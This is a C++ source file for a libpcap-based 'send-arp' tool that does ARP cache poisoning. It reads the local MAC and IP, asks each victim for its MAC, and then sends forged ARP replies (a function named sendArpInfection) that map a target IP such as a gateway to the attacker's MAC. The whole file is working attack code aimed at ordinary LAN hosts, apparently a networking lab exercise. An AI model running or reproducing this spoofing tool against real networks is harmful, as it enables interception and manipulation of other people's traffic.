#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <pcap.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac getAttackerMacAddress(const char* dev) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    struct ifreq ifr;
    strcpy(ifr.ifr_name, dev);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(fd);
        exit(EXIT_FAILURE);
    }
    close(fd);
    return Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
}

Ip getAttackerIpAddress(const char* dev) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    struct ifreq ifr;
    strcpy(ifr.ifr_name, dev);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl");
        close(fd);
        exit(EXIT_FAILURE);
    }
    close(fd);
    return Ip(inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
}

Mac getMacAddress(pcap_t* handle, Ip ip, Mac attackerMac, Ip attackerIp) {
    EthArpPacket packet;

    
    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = attackerMac;
    packet.eth_.type_ = htons(EthHdr::Arp);


    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = attackerMac;
    packet.arp_.sip_ = htonl(attackerIp);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(ip);

   
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* replyPacket;
        int res = pcap_next_ex(handle, &header, &replyPacket);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
            break;
        }

        EthArpPacket* reply = (EthArpPacket*)replyPacket;
        if (ntohs(reply->eth_.type_) == EthHdr::Arp &&
            ntohs(reply->arp_.op_) == ArpHdr::Reply &&
            reply->arp_.sip() == ip) {
            return reply->arp_.smac();
        }
    }

    return Mac("00:00:00:00:00:00");
}

void sendArpInfection(pcap_t* handle, Mac attackerMac, Ip senderIp, Mac senderMac, Ip targetIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = senderMac;
    packet.eth_.smac_ = attackerMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attackerMac;
    packet.arp_.sip_ = htonl(targetIp);
    packet.arp_.tmac_ = senderMac;
    packet.arp_.tip_ = htonl(senderIp);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac attackerMac = getAttackerMacAddress(dev);
    Ip attackerIp = getAttackerIpAddress(dev);

    for (int i = 2; i < argc; i += 2) {
        Ip senderIp = Ip(argv[i]);
        Ip targetIp = Ip(argv[i + 1]);

        
        Mac senderMac = getMacAddress(handle, senderIp, attackerMac, attackerIp);

        
        sendArpInfection(handle, attackerMac, senderIp, senderMac, targetIp);
    }

    pcap_close(handle);
}
